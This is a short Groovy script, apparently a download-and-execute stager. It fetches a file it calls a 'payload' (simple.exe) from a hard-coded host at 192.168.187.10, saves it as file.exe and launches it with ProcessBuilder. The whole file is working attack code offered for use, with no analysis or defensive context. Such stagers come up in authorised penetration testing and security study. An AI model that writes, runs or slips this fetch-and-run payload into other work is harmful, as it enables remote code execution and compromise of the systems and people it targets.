import java.net.URL
import java.nio.file.Files
import java.nio.file.Paths

def url = "http://192.168.187.10/simple.exe" // Where to get payload from
def destination = "file.exe"                 // Name of payload on disk (TODO: change location?)
def command = "./file.exe"                   // Path to payload on disk
def args = []                                // Arguments to launch payload with (not needed?)

def downloadFile(String url, String destination) {
    try {
        // Create URL object
        URL fileUrl = new URL(url)
        
        // Open connection to the URL
        def connection = fileUrl.openConnection()
        
        // Get input stream from the connection
        def inputStream = connection.getInputStream()
        
        // Create destination file
        def outputFile = new File(destination)
        
        // Write data from input stream to destination file
        Files.copy(inputStream, Paths.get(outputFile.toURI()))
        
        println("File downloaded successfully to: $destination")
    } catch (Exception e) {
        println("Error downloading file: ${e.message}")
    }
}


// Downlaod file from remote host and then execute it
downloadFile(url, destination)
def processBuilder = new ProcessBuilder([command] + args)
try {
    def process = processBuilder.start()
} catch (IOException e) {
    println "An error occurred: ${e.message}"
}
